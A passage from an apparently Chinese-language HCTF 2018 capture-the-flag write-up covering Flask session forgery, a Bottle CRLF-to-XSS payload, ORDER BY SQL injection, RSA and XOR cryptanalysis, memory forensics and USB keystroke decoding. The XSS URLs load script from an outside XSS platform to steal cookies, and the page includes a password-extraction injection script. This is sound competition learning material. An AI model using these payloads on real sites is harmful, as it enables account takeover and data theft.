plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask </span><br><span class="line">app &#x3D; Flask(__name__) </span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;) </span><br><span class="line">def hello(): </span><br><span class="line">return &quot;Hello World from Flask in a uWSGI Nginx Docker container with \ Python 3.6 (default)&quot; </span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;: </span><br><span class="line">app.run(host&#x3D;&#39;0.0.0.0&#39;, debug&#x3D;True, port&#x3D;80)</span><br></pre></td></tr></table></figure><p>py3.6</p><p>于是可以伪造session</p><p>对于<code>uuid.getnode()</code><br>同样方式读取<code>/sys/class/net/eth0/address</code><br>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12:34:3e:14:7c:62</span><br></pre></td></tr></table></figure><p>计算十进制：<code>20015589129314</code><br>用python3.6去看一下随机数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import random</span><br><span class="line">&gt;&gt;&gt; random.seed(20015589129314)</span><br><span class="line">&gt;&gt;&gt; print(str(random.random()*100))</span><br><span class="line">11.935137566861131</span><br></pre></td></tr></table></figure><p>得到<code>secret_key=11.935137566861131</code></p><p>本地搭建一个环境，用于生成session</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;11.935137566861131&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#登录&amp;注册页面</span></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">u&#x27;admin&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;aa&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>得到伪造的session</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.DsqsZg.BfDKFJ-Mb6MqAvozONjnbKlUM4c</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181112142214.png"></p><h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><p>submit url 容易想到CSRF或者SSRF之类的攻击，测试发现有一个302跳转(/path?path=)</p><p>思路还是CSRF+XSS 打cookie</p><p>学习p牛的文章<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究</a></p><p>发现可以通过CRLF挤掉CSP构造xss打回cookie来</p><p>需要设置<code>X-XSS-Protect</code>和<code>Content-Length</code>，但是，后来测试不加似乎也是可以的。。。</p><p>我是使用XSS平台的，payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;user%0d%0aX-XSS-Protection:0%0d%0aContent-Length:300%0d%0a%0d%0a%3Cscript%20src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;XXXXXX%3E%3C&#x2F;script%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;user%0d%0a%0d%0a%3Cscript%20src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;XXXXXXX%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181112171322.png"></p><p>容易得到cookie,将cookie设置一下，再次访问题目链接，得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bottle.session&#x3D;b0ddffbc22e34e7fb49d460d9512c69c</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181112182537.png"></p><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p>数据量太大了,加载的时候，我还以为是延时注入成功了==、</p><p>其实本题是考察<code>OrderBy注入</code>，可惜的是，明明还看过OrderBy注入，却没想到==、</p><p>学习了。</p><hr><p>OrderBy注入原理可以参考<a href="https://p0sec.net/index.php/archives/106/">p0神博客</a></p><p>直接打开flag文件，提示说只有admin用户才能打开。</p><p>于是我们可以利用SQL注入来获取admin用户的密码，从而读取flag文件。</p><p>注册新用户，密码逐位逐位与admin的密码比较，最后得到admin的密码，密码这样可以按照密码进行排序，比如注册个密码为d的用户，然后登陆后用password排序</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;game.2018.hctf.io&#x2F;web2&#x2F;user.php?order&#x3D;password</span><br></pre></td></tr></table></figure><p>发现注册的用户在admin上面，说明admin密码第一位<code>password[0] &gt;= &#39;d&#39;</code></p><p>同理，注册密码为e的用户，测试发现注册用户在admin下方，于是admin密码第一位<code>password[0] &lt; &#39;e&#39;</code></p><p>于是可以得到结论  <code>password[0] == &#39;d&#39;</code></p><p>不断注册新用户，便可以逐位爆破出admin密码</p><p>附上脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">        <span class="string">&quot;sex&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;submit&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    content = requests.post(url=url,data=data).content</span><br><span class="line">    <span class="keyword">print</span> content</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">&quot;http://game.2018.hctf.io/web2/action.php?action=login&quot;</span></span><br><span class="line">ss =  <span class="string">&quot;-/123456789&quot;</span>+string.lowercase</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">126</span>):</span><br><span class="line">        username = <span class="string">&quot;v0w0012112nkakab&quot;</span>+str(i) +<span class="string">&quot;zssugar&quot;</span>+str(j)</span><br><span class="line">        password = flag + chr(j)</span><br><span class="line">        <span class="comment"># print username,password</span></span><br><span class="line">        reg(username,password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:str(password),</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print data</span></span><br><span class="line">        req = requests.session()</span><br><span class="line">        content = req.post(url=login_url,data=data).content</span><br><span class="line">        <span class="comment">#print content</span></span><br><span class="line">        order_url = <span class="string">&quot;http://game.2018.hctf.io/web2/user.php?order=password&quot;</span></span><br><span class="line">        content = req.get(url=order_url).content</span><br><span class="line">        <span class="comment">#print content</span></span><br><span class="line">        tmp = re.findall(<span class="string">r&#x27;%s[.\s\S]+?&lt;td&gt;\s*1\s*&lt;/td&gt;\s*&lt;td&gt;\s*admin\s*&lt;/td&gt;&#x27;</span>%username,content,re.S)</span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">            flag = flag + chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后跑出了密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dja</span><br></pre></td></tr></table></figure><p>然后读取flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hctf&#123;this_idea_h1t_me_whil3_I_am_W3rking&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xor-rsa"><a href="#xor-rsa" class="headerlink" title="xor?rsa"></a>xor?rsa</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbits &#x3D; size(n)</span><br><span class="line">kbits &#x3D; nbits &#x2F;&#x2F; (2 * e * e)</span><br><span class="line">m1 &#x3D; getRandomNBitInteger(nbits)</span><br><span class="line">m2 &#x3D; m1 ^ getRandomNBitInteger(kbits)</span><br></pre></td></tr></table></figure><p>padding 长度为 nbits/e^2,长度过短 会造成短填充攻击</p><p>可以求得m1-m2的差值diff</p><p>知道c1、c2、diff、e、n可以进行相关信息攻击</p><p>得到m1，m2发送过去即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#short_pad_attack</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = <span class="number">27325117725066040425607261774702361305480031598260844657255259687949217947185875178414548742392020321812299436880101297227536559351730987915023996386949560743215563482065620796558339146309680837896911726355137737632498099719814507374535188668253558193836192571274971401444835848784952120830068942707870865057672494962150591569745891058420271040371596557379014064434807827018829839225991842910855143477861477983283840739861588719497836896794690605981838804564450022566211353870681343247472863651535379377939787977703685860325769265931265226619644497391491291527800611615877993682121665020799611215291015673668800698047</span></span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = nbits//(<span class="number">2</span>*e*e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;upper %d bits (of %d bits) is same&quot;</span> % (nbits-kbits, nbits)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ^^ = bit-wise XOR</span></span><br><span class="line">    <span class="comment">#m1 = randrange(2^nbits)</span></span><br><span class="line">    <span class="comment">#m2 = m1 ^^ randrange(2^kbits)</span></span><br><span class="line">    <span class="comment">#c1 = pow(m1, e, n)</span></span><br><span class="line">    <span class="comment">#c2 = pow(m2, e, n)</span></span><br><span class="line">    c1 = <span class="number">11146034647280413317443457623961239386839900851075033268495975097708099527017335893963808711594413240859252161601911195036434302423516981466705590143210837021632070692393449550584035345686324553211866055113228844210586772947411150216954229676034855823178188075496107807422868588742623940922760678808366543964733293726627911767243105246511250395661759753616263358374760407323735205233663336331991977749138009890575029063032763890464116037245275157079519540406571208629258706809359182978155122176341736830080587038326813241565093027445769495005048088248614564197179762009363506397136188047072831062771044194671584000093</span></span><br><span class="line">    c2 = <span class="number">1206394889096499960081166011318481718487253865371591152275319942955987797889761136562701508553079502547193102588852377842551044867961440512715093383379196683866396069689611910096194350083404638346362642034206212849366833513854922022537854397304980423004330041027521742652293082886524946291846011200632987593435588619763971528985802898982891100146430607274314417600181969864547689720620303929732924061673055082880492983474112109999173957339098639555381626435870355703616291445746057601759611370928227297606247782969343337389538257681315001213167257800476196167120597495582636973391942846610897276862327699998885589310</span></span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;difference of two messages is %d&quot;</span> % diff</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print m1</span></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;m1 = &quot;</span>: m1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;m2 = &quot;</span>: m1 + diff</span><br></pre></td></tr></table></figure><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fx4hl0qqhtj31kw0i71fe.jpg" alt="20181111154194557071025.jpg"></p><h2 id="xor-game"><a href="#xor-game" class="headerlink" title="xor_game"></a>xor_game</h2><p><a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/">AlexCTF 2017 : crypto100-many_time_secrets</a></p><p>参考<a href="https://www.anquanke.com/post/id/161171">小记一类ctf密码题解题思路</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span>(<span class="params">b1, b2</span>):</span></span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_single_key_xor</span>(<span class="params">text</span>):</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> chr(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;cipher.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        text += line</span><br><span class="line">b = base64.b64decode(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="comment">#我们取其中前6段计算平局汉明距离</span></span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) + </span><br><span class="line">        hamming_distance(b5, b6) </span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = bytearray(keys * len(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">        print(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        s = bytes.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Easy-dump"><a href="#Easy-dump" class="headerlink" title="Easy_dump"></a>Easy_dump</h2><p><a href="https://www.rootusers.com/google-ctf-2016-forensic-for1-write-up/">参考链接</a></p><ol><li><p><code>volatility</code>查看信息和进程情况</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f mem.data imageinfo</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541824041425.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f mem.data --profile&#x3D;Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541824122767.png"></p></li></ol><p>   一开始，看了看notepad和explorer，但是没有什么发现，于是重点放在了mspaint上面。</p><p>   首先，将其数据取出：</p>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f mem.data --profile&#x3D;Win7SP1x64 memdump -p 2768 -D ~&#x2F;Desktop&#x2F;mem</span><br><span class="line"># 之后为了方便在gimp中打开，将*.dmp 复制为 *.data</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;mem# cat 2768.dmp &gt; 2768.data</span><br></pre></td></tr></table></figure><ol start="2"><li><p>利用gimp修复图像数据</p><p><a href="https://www.gimp.org/">gimp下载地址</a></p><p>以data形式打开刚才dump出来的数据。</p><p>调整偏移量来获取更多信息：</p><p>在偏移字段上按住向上箭头一段时间之后，我扩展了窗口并稍微修改了宽度以适应更多的屏幕，然后开始拖动偏移指针以寻找任何interesting的东西。最后幸运的是我找到了一些东西，在进一步调整宽度之后我找到了下面显示的标志。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541824740409.png"></p><p>不难看出，这是提示，flag应该就在稍上面一些的位置。于是继续调整，得到以下数据截图</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541825008597.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541825066391.png"></p></li><li><p>在PS中调整上述图片，容易得到flag</p><p>hctf{big_brother_is _watching_you}</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/HCTF_easy_dunm_ps1.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/HCTF_easy_dump_ps2.png"></p></li></ol><h2 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h2><p>首先很明显，是一个USB数据包，常规操作来提取一下。</p><p>这里我本来使用王一航表哥的脚本，但是发现有问题！！！（此处轻声批评一下王一航表哥）部分keyboard对应关系不正确。</p><p>于是改了改表哥的脚本，能用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># env:kali</span></span><br><span class="line"><span class="comment"># yihangwang use some wrong keypad-mapping like(shitfKeys[0x33]=&#x27;:&#x27; but he made it error)</span></span><br><span class="line"><span class="comment"># also 0rz</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">&quot;usb.dat&quot;</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;`&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span 